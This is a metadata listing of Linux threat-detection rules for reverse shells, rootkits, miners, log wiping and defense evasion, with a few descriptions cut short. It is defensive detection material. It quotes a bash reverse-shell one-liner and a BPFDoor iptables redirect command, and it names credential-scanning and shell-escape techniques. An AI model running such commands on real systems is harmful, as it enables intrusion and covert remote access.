rules.title: Suspicious Curl File Upload - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems), Cedric MAURUGEON (Update)
rules.desc: Detects a suspicious curl process start the adds a file to a web request
fp: Scripts created by developers and admins

rules.title: Linux Doas Conf File Creation
rules.author: Sittikorn S, Teoderick Contreras
rules.desc: Detects the creation of doas.conf file in linux host platform.

rules.title: Triple Cross eBPF Rootkit Execve Hijack
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects execution of a the file "execve_hijack" which is used by the Triple Cross rootkit as a way to elevate privileges

rules.title: Possible Coin Miner CPU Priority Param
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects command line parameter very often used with coin miners
fp: Other tools that use a --cpu-priority flag

rules.title: User Has Been Deleted Via Userdel
rules.author: Tuan Le (NCSGroup)
rules.desc: Detects execution of the "userdel" binary. Which is used to delete a user account and related files. This is sometimes abused by threat actors in order to cover their tracks

rules.title: Shell Execution via Nice - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the "nice" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Linux Recon Indicators
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects events with patterns found in commands used for reconnaissance on linux systems

rules.title: Access of Sudoers File Content
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects the execution of a text-based file access or inspection utilities to read the content of /etc/sudoers in order to potentially list all users that have sudo rights.

rules.title: Loading of Kernel Module via Insmod
rules.author: Pawel Mazur
rules.desc: Detects loading of kernel modules with insmod command. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. Adversaries may use LKMs to obtain persistence within the system or elevate the privileges.

rules.title: History File Deletion
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity

rules.title: Suspicious Commands Linux
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects relevant commands often related to malware or hacking activity

rules.title: Suspicious Filename with Embedded Base64 Commands
rules.author: @kostastsale
rules.desc: Detects files with specially crafted filenames that embed Base64-encoded bash payloads designed to execute when processed by shell scripts. These filenames exploit shell interpretation quirks to trigger hidden commands, a technique observed in VShell malware campaigns.
fp: Legitimate files with similar naming patterns (very unlikely).

rules.title: Triple Cross eBPF Rootkit Default Persistence
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the creation of "ebpfbackdoor" files in both "cron.d" and "sudoers.d" directories. Which both are related to the TripleCross persistence method

rules.title: Systemd Service Creation
rules.author: Pawel Mazur
rules.desc: Detects a creation of systemd services which could be used by adversaries to execute malicious code.
fp: Admin work like legit service installs.

rules.title: Triple Cross eBPF Rootkit Install Commands
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects default install commands of the Triple Cross eBPF rootkit based on the "deployer.sh" script

rules.title: Potential Perl Reverse Shell Execution
rules.author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects execution of the perl binary with the "-e" flag and common strings related to potential reverse shell activity

rules.title: Suspicious Invocation of Shell via Rsync
rules.author: Florian Roth
rules.desc: Detects the execution of a shell as sub process of "rsync" without the expected command line flag "-e" being used, which could be an indication of exploitation as described in CVE-2024-12084. This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.

rules.title: ESXi VM Kill Via ESXCLI
rules.author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon
rules.desc: Detects execution of the "esxcli" command with the "vm" and "kill" flag in order to kill/shutdown a specific VM.

rules.title: Inline Python Execution - Spawn Shell Via OS System Library
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects execution of inline Python code via the "-c" in order to call the "system" function from the "os" library, and spawn a shell.

rules.title: Shell Execution Of Process Located In Tmp Directory
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects execution of shells from a parent process located in a temporary (/tmp) directory

rules.title: Execution Of Script Located In Potentially Suspicious Directory
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects executions of scripts located in potentially suspicious locations such as "/tmp" via a shell such as "bash", "sh", etc.

rules.title: Potentially Suspicious Execution From Tmp Folder
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects a potentially suspicious execution of a process located in the '/tmp/' folder

rules.title: Touch Suspicious Service File
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects usage of the "touch" process in service file.

rules.title: Modify System Firewall
rules.author: IAI
rules.desc: Detects the removal of system firewall rules. Adversaries may only delete or modify a specific system firewall rule to bypass controls limiting network usage or access. Detection rules that match only on the disabling of firewalls will miss this.

rules.title: Python Reverse Shell Execution Via PTY And Socket Modules
rules.author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the execution of python with calls to the socket and pty module in order to connect and spawn a potential reverse shell.

rules.title: ESXi Network Configuration Discovery Via ESXCLI
rules.author: Cedric Maurugeon
rules.desc: Detects execution of the "esxcli" command with the "network" flag in order to retrieve information about the network configuration.

rules.title: Remove Immutable File Attribute
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects usage of the 'chattr' utility to remove immutable file attribute.
fp: Administrator interacting with immutable files (e.g. for instance backups).

rules.title: Kaspersky Endpoint Security Stopped Via CommandLine - Linux
rules.author: Milad Cheraghi
rules.desc: Detects execution of the Kaspersky init.d stop script on Linux systems either directly or via systemctl. This activity may indicate a manual interruption of the antivirus service by an administrator, or it could be a sign of potential tampering or evasion attempts by malicious actors.
fp: System administrator manually stopping Kaspersky services

rules.title: ESXi Syslog Configuration Change Via ESXCLI
rules.author: Cedric Maurugeon
rules.desc: Detects changes to the ESXi syslog configuration via "esxcli"

rules.title: Flush Iptables Ufw Chain
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic

rules.title: Python WebServer Execution - Linux
rules.author: Mohamed LAKRI
rules.desc: Detects the execution of Python web servers via command line interface (CLI). After gaining access to target systems, adversaries may use Python's built-in HTTP server modules to quickly establish a web server without requiring additional software. This technique is commonly used in post-exploitation scenarios as it provides a simple method for transferring files between the compromised host and a

rules.title: Syslog Clearing or Removal Via System Utilities
rules.author: Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC
rules.desc: Detects specific commands commonly used to remove or empty the syslog. Which is a technique often used by attacker as a method to hide their tracks

rules.title: Suspicious Nohup Execution
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects execution of binaries located in potentially suspicious locations via "nohup"

rules.title: Shell Execution via Git - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the "git" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Linux Keylogging with Pam.d
rules.author: Pawel Mazur
rules.desc: Detect attempt to enable auditing of TTY input

rules.title: Shell Execution via Flock - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the "flock" command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Modification of ld.so.preload
rules.author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community
rules.desc: Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.

rules.title: Potential Linux Process Code Injection Via DD Utility
rules.author: Joseph Kamau
rules.desc: Detects the injection of code by overwriting the memory map of a Linux process using the "dd" Linux command.

rules.title: Potential Xterm Reverse Shell
rules.author: @d4ns4n_
rules.desc: Detects usage of "xterm" as a potential reverse shell tunnel

rules.title: Python One-Liners with Base64 Decoding - Linux
rules.author: Hugh Ryan (HueCodes), Swachchhanda Shrawan Poudel (Nextron Systems)
rules.desc: Detects the use of Python's base64 decoding functions in command line executions on Linux systems. Malicious scripts often use python one-liners to decode and execute base64-encoded payloads, which is a common technique for obfuscation and evasion.
fp: Legitimate use of Python for decoding data, which is uncommon in typical enterprise environments but possible in development or data analysis contexts.

rules.title: Process Execution From Shared Memory Directory
rules.author: Stan Beukers
rules.desc: Detects the execution of a binary from the Linux shared memory directory /dev/shm. This directory is a tmpfs mount backed entirely by RAM and is abused by attackers for fileless malware staging because files written there never touch physical disk and may evade disk-based detection.
fp: Unlikely in production environments; some container runtimes or IPC frameworks may use /dev/shm for inter-process communication but should not spawn executables.

rules.title: ESXi VM List Discovery Via ESXCLI
rules.author: Cedric Maurugeon
rules.desc: Detects execution of the "esxcli" command with the "vm" flag in order to retrieve information about the installed VMs.

rules.title: Chmod Targeting Sensitive Directories
rules.author: Christopher Peacock @SecurePeacock, SCYTHE @scythe_io
rules.desc: Detects chmod targeting files in sensitive directory paths on Linux systems. Attackers may use chmod to change permissions of files in these directories to maintain persistence, escalate privileges, or disrupt system operations.
fp: Some false positives are to be expected. Apply additional filters as needed before pushing to production.

rules.title: User Added To Root/Sudoers Group Using Usermod
rules.author: TuanLe (GTSC)
rules.desc: Detects usage of the "usermod" binary to add users add users to the root or suoders groups

rules.title: Shell Execution via Find - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the find command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or exploitation attempt.

rules.title: Scheduled Cron Task/Job - Linux
rules.author: Alejandro Ortuno, oscd.community
rules.desc: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.

rules.title: Suspicious Package Installed - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects installation of suspicious packages using system installation utilities

rules.title: Bpfdoor TCP Ports Redirect
rules.author: Rafal Piasecki
rules.desc: All TCP traffic on particular port from attacker is routed to different port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22 -j REDIRECT --to-ports 42392' The traffic looks like encrypted SSH communications going to TCP port 22, but in reality is being directed to the shell port once it hits the iptables rule for the attacker host only.

rules.title: Creation Of An User Account
rules.author: Marie Euler, Pawel Mazur
rules.desc: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

rules.title: Enable BPF Kprobes Tracing
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects common command used to enable bpf kprobes tracing

rules.title: Vim GTFOBin Abuse - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems), Luc Génaux
rules.desc: Detects the use of "vim" and it's siblings commands to execute a shell or proxy commands. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Potential Netcat Reverse Shell Execution
rules.author: @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects execution of netcat with the "-e" or "-c" flags followed by common shells, which are commonly used to spawn reverse shells.

rules.title: BPFDoor Abnormal Process ID or Lock File Accessed
rules.author: Rafal Piasecki
rules.desc: detects BPFDoor .lock and .pid files access in temporary file storage facility

rules.title: Linux Logs Clearing Attempts
rules.author: Ömer Günal, oscd.community
rules.desc: Detects logs clearing attempts on Linux systems via utilities such as 'rm', 'rmdir', 'shred', and 'unlink' targeting log files and directories. Adversaries often try to clear logs to cover their tracks after performing malicious activities.

rules.title: Linux Webshell Indicators
rules.author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects suspicious sub processes of web server processes
fp: Web applications that invoke Linux command line tools

rules.title: Potential Discovery Activity Using Find - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects usage of "find" binary in a suspicious manner to perform discovery

rules.title: Linux Reverse Shell Indicator
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

rules.title: UFW Disable Attempt
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects attempts to disable the Uncomplicated Firewall (UFW) on Linux systems. UFW is a popular firewall management tool that provides an easy-to-use interface for configuring firewall rules. Disabling UFW can leave a system vulnerable to attacks, as it may allow unauthorized access to network services and resources.
fp: Legitimate actions by system administrators to disable UFW.

rules.title: Potential Suspicious Change To Sensitive/Critical Files
rules.author: @d4ns4n_ (Wuerth-Phoenix)
rules.desc: Detects changes of sensitive and critical files. Monitors files that you don't expect to change without planning on Linux system. These files include, but are not limited to, system configuration files, authentication files, and critical application files. Attackers often target these files to maintain persistence, escalate privileges, or disrupt system operations.
fp: Some false positives are to be expected on user or administrator machines. Apply additional filters as needed.

rules.title: Shell Invocation Via Ssh - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the "ssh" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Linux Shell Pipe to Shell
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell
fp: Legitimate software that uses these patterns

rules.title: Group Has Been Deleted Via Groupdel
rules.author: Tuan Le (NCSGroup)
rules.desc: Detects execution of the "groupdel" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks

rules.title: Suspicious Invocation of Shell via AWK - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the execution of "awk" or it's sibling commands, to invoke a shell using the system() function. This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.

rules.title: Shell Spawned by Celery Worker Process
rules.author: Jennifer Batina
rules.desc: Detects a system shell interpreter being spawned directly by a Celery worker process. This behavior indicates a Python background task execution framework is evaluating raw string input through a shell execution context, which is highly indicative of successful command or prompt injection exploitation against an LLM agent task.
fp: Legacy or custom administrative tasks deliberately hardcoded with shell=True or os.system execution inside Celery task functions.
Media processing, deployment, or reporting pipelines that intentionally shell out to external tools (e.g. ffmpeg, git) from within a task.

rules.title: Linux Crypto Mining Indicators
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects command line parameters or strings often used by crypto miners

rules.title: ESXi Admin Permission Assigned To Account Via ESXCLI
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects execution of the "esxcli" command with the "system" and "permission" flags in order to assign admin permissions to an account.

rules.title: Auditing Configuration Changes on Linux Host
rules.author: Mikhail Larin, oscd.community
rules.desc: Detect changes in auditd configuration files

rules.title: Pnscan Binary Data Transmission Activity
rules.author: David Burkett (@signalblur)
rules.desc: Detects command line patterns associated with the use of Pnscan for sending and receiving binary data across the network. This behavior has been identified in a Linux malware campaign targeting Docker, Apache Hadoop, Redis, and Confluence and was previously used by the threat actor known as TeamTNT

rules.title: Potentially Suspicious Named Pipe Created Via Mkfifo
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the creation of a new named pipe using the "mkfifo" utility in a potentially suspicious location

rules.title: Shell Execution GCC  - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the "gcc" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Masquerading as Linux Crond Process
rules.author: Timur Zinniatullin, oscd.community
rules.desc: Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.

rules.title: Linux HackTool Execution
rules.author: Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein (sure[secure])
rules.desc: Detects known hacktool execution based on image name.

rules.title: Suspicious Download and Execute Pattern via Curl/Wget
rules.author: Aayush Gupta
rules.desc: Detects suspicious use of command-line tools such as curl or wget to download remote content - particularly scripts - into temporary directories (e.g., /dev/shm, /tmp), followed by immediate execution, indicating potential malicious activity. This pattern is commonly used by malicious scripts, stagers, or downloaders in fileless or multi-stage Linux attacks.
fp: System update scripts using temporary files
Installer scripts or automated provisioning tools

rules.title: Program Executions in Suspicious Folders
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects program executions in suspicious non-program folders related to malware or hacking activity

rules.title: Remove Immutable File Attribute - Auditd
rules.author: Jakob Weinzettl, oscd.community
rules.desc: Detects removing immutable file attribute.
fp: Administrator interacting with immutable files (e.g. for instance backups).

rules.title: Unix Shell Configuration Modification
rules.author: Peter Matkovski, IAI
rules.desc: Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.
fp: Admin or User activity are expected to generate some false positives

rules.title: ESXi Account Creation Via ESXCLI
rules.author: Cedric Maurugeon
rules.desc: Detects user account creation on ESXi system via esxcli

rules.title: File Time Attribute Change - Linux
rules.author: Igor Fits, oscd.community
rules.desc: Detect file time attribute change to hide new or changes to existing files.

rules.title: Suspicious Curl Change User Agents - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects a suspicious curl process start on linux with set useragent options
fp: Scripts created by developers and admins

rules.title: Potential Ruby Reverse Shell
rules.author: @d4ns4n_
rules.desc: Detects execution of ruby with the "-e" flag and calls to "socket" related functions. This could be an indication of a potential attempt to setup a reverse shell

rules.title: Linux Base64 Encoded Pipe to Shell
rules.author: pH-T (Nextron Systems)
rules.desc: Detects suspicious process command line that uses base64 encoded input for execution with a shell

rules.title: Shell Invocation via Apt - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the use of the "apt" and "apt-get" commands to execute a shell or proxy commands. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.title: Audit Rules Deleted Via Auditctl
rules.author: Mohamed LAKRI
rules.desc: Detects the execution of 'auditctl' with the '-D' command line parameter, which deletes all configured audit rules and watches on Linux systems. This technique is commonly used by attackers to disable audit logging and cover their tracks by removing monitoring capabilities. Removal of audit rules can significantly impair detection of malicious activities on the affected system.
fp: An administrator troubleshooting. Investigate all attempts.

rules.title: Shell Invocation via Env Command - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the env command to invoke a shell. This may indicate an attempt to bypass restricted environments, escalate privileges, or execute arbitrary commands.

rules.title: Triple Cross eBPF Rootkit Default LockFile
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the creation of the file "rootlog" which is used by the TripleCross rootkit as a way to check if the backdoor is already running.

rules.title: Webshell Remote Command Execution
rules.author: Ilyas Ochkov, Beyu Denis, oscd.community
rules.desc: Detects possible command execution by web application/web shell

rules.title: Mask System Power Settings Via Systemctl
rules.author: Milad Cheraghi, Nasreddine Bencherchali
rules.desc: Detects the use of systemctl mask to disable system power management targets such as suspend, hibernate, or hybrid sleep. Adversaries may mask these targets to prevent a system from entering sleep or shutdown states, ensuring their malicious processes remain active and uninterrupted. This behavior can be associated with persistence or defense evasion, as it impairs normal system power operations t

rules.title: Remove Scheduled Cron Task/Job
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects usage of the 'crontab' utility to remove the current crontab. This is a common occurrence where cryptocurrency miners compete against each other by removing traces of other miners to hijack the maximum amount of resources possible

rules.title: Python Spawning Pretty TTY Via PTY Module
rules.author: Nextron Systems
rules.desc: Detects a python process calling to the PTY module in order to spawn a pretty tty which could be indicative of potential reverse shell activity.

rules.title: Binary Padding - Linux
rules.author: Igor Fits, oscd.community
rules.desc: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.

rules.title: Potential PHP Reverse Shell
rules.author: @d4ns4n_
rules.desc: Detects usage of the PHP CLI with the "-r" flag which allows it to run inline PHP code. The rule looks for calls to the "fsockopen" function which allows the creation of sockets. Attackers often leverage this in combination with functions such as "exec" or "fopen" to initiate a reverse shell connection.

rules.title: Logging Configuration Changes on Linux Host
rules.author: Mikhail Larin, oscd.community
rules.desc: Detect changes of syslog daemons configuration files

rules.title: Data Exfiltration with Wget
rules.author: Pawel Mazur
rules.desc: Detects attempts to post the file with the usage of wget utility. The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.
fp: Legitimate usage of wget utility to post a file

rules.title: Download File To Potentially Suspicious Directory Via Wget
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects the use of wget to download content to a suspicious directory

rules.title: Suspicious Git Clone - Linux
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects execution of "git" in order to clone a remote repository that contain suspicious keywords which might be suspicious

rules.title: Suspicious Java Children Processes
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects java process spawning suspicious children

rules.title: ESXi VSAN Information Discovery Via ESXCLI
rules.author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon
rules.desc: Detects execution of the "esxcli" command with the "vsan" flag in order to retrieve information about virtual storage. Seen used by malware such as DarkSide.

rules.title: Print History File Contents
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance

rules.title: PUA - TruffleHog Execution - Linux
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)
rules.desc: Detects execution of TruffleHog, a tool used to search for secrets in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used maliciously. While it is a legitimate tool, intended for use in CI pipelines and security assessments, It was observed in the Shai-Hulud malware campaign targeting npm packages to steal sensitive information.
fp: Legitimate use of TruffleHog by security teams or developers.

rules.title: Capsh Shell Invocation - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
rules.desc: Detects the use of the "capsh" utility to invoke a shell.

rules.title: Potentially Suspicious Malware Callback Communication - Linux
rules.author: hasselj
rules.desc: Detects programs that connect to known malware callback ports based on threat intelligence reports.

rules.title: Disable Or Stop Services
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services on Linux systems. Attackers may stop or disable security tools and services to evade detection, maintain persistence, or disrupt system operations.
fp: Some false positives are to be expected. Apply additional filters as needed before pushing to production.

rules.title: Credentials In Files - Linux
rules.author: Igor Fits, oscd.community
rules.desc: Detecting attempts to extract passwords with grep

rules.title: Shell Execution via Rsync - Linux
rules.author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.), Florian Roth
rules.desc: Detects the use of the "rsync" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
fp: Legitimate cases in which "rsync" is used to execute a shell

rules.title: Potential GobRAT File Discovery Via Grep
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects the use of grep to discover specific files created by the GobRAT malware

rules.title: Disabling Security Tools
rules.author: Ömer Günal, Alejandro Ortuno, oscd.community
rules.desc: Detects disabling security tools

rules.title: ASLR Disabled Via Sysctl or Direct Syscall - Linux
rules.author: Milad Cheraghi
rules.desc: Detects actions that disable Address Space Layout Randomization (ASLR) in Linux, including: - Use of the `personality` syscall with the ADDR_NO_RANDOMIZE flag (0x0040000) - Modification of the /proc/sys/kernel/randomize_va_space file - Execution of the `sysctl` command to set `kernel.randomize_va_space=0` Disabling ASLR is often used by attackers during exploit development or to bypass memory prot

rules.title: Nohup Execution
rules.author: Christopher Peacock @SecurePeacock, SCYTHE @scythe_io
rules.desc: Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments
fp: Administrators or installed processes that leverage nohup

rules.title: ESXi System Information Discovery Via ESXCLI
rules.author: Cedric Maurugeon
rules.desc: Detects execution of the "esxcli" command with the "system" flag in order to retrieve information about the different component of the system. Such as accounts, modules, NTP, etc.

rules.title: Interactive Bash Suspicious Children
rules.author: Florian Roth (Nextron Systems)
rules.desc: Detects suspicious interactive bash as a parent to rather uncommon child processes
fp: Legitimate software that uses these patterns

rules.title: Potential Abuse of Linux Magic System Request Key
rules.author: Milad Cheraghi
rules.desc: Detects the potential abuse of the Linux Magic SysRq (System Request) key by adversaries with root or sufficient privileges to silently manipulate or destabilize a system. By writing to /proc/sysrq-trigger, they can crash the system, kill processes, or disrupt forensic analysis—all while bypassing standard logging. rules.title: Suspicious History File Operations - Linux
rules.author: Mikhail Larin, oscd.community
rules.desc: Detects commandline operations on shell history files

rules.title: Mount Execution With Hidepid Parameter
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects execution of the "mount" command with "hidepid" parameter to make invisible processes to other users from the system

rules.title: Clear or Disable Kernel Ring Buffer Logs via Syslog Syscall
rules.author: Milad Cheraghi
rules.desc: Detects the use of the `syslog` syscall with action code 5 (SYSLOG_ACTION_CLEAR), (4 is SYSLOG_ACTION_READ_CLEAR and 6 is SYSLOG_ACTION_CONSOLE_OFF) which clears the kernel ring buffer (dmesg logs). This can be used by attackers to hide traces after exploitation or privilege escalation. A common technique is running `dmesg -c`, which triggers this syscall internally.
fp: System administrators or scripts that intentionally clear logs

rules.title: Script Interpreter Spawning Credential Scanner - Linux
rules.author: Swachchhanda Shrawan Poudel (Nextron Systems)
rules.desc: Detects a script interpreter process (like node.js or bun) spawning a known credential scanning tool (e.g., trufflehog, gitleaks). This behavior is indicative of an attempt to find and steal secrets, as seen in the "Shai-Hulud: The Second Coming" campaign.
fp: Legitimate pre-commit hooks or CI/CD pipeline jobs that use a script to run a credential scanner as part of a security check.

rules.title: ESXi Storage Information Discovery Via ESXCLI
rules.author: Nasreddine Bencherchali (Nextron Systems), Cedric Maurugeon
rules.desc: Detects execution of the "esxcli" command with the "storage" flag in order to retrieve information about the storage status and other related information. Seen used by malware such as DarkSide and LockBit.

rules.title: Suspicious C2 Activities
rules.author: Marie Euler

rules.title: BPFtrace Unsafe Option Usage
rules.author: Andreas Hunkeler (@Karneades)
rules.desc: Detects the usage of the unsafe bpftrace option
fp: Legitimate usage of the unsafe option

rules.title: Potential Linux Amazon SSM Agent Hijacking
rules.author: Muhammad Faisal
rules.desc: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.

rules.title: Copy Passwd Or Shadow From TMP Path
rules.author: Joseliyo Sanchez, @Joseliyo_Jstnk
rules.desc: Detects when the file "passwd" or "shadow" is copied from tmp path

rules.title: Linux Base64 Encoded Shebang In CLI
rules.author: Nasreddine Bencherchali (Nextron Systems)
rules.desc: Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded
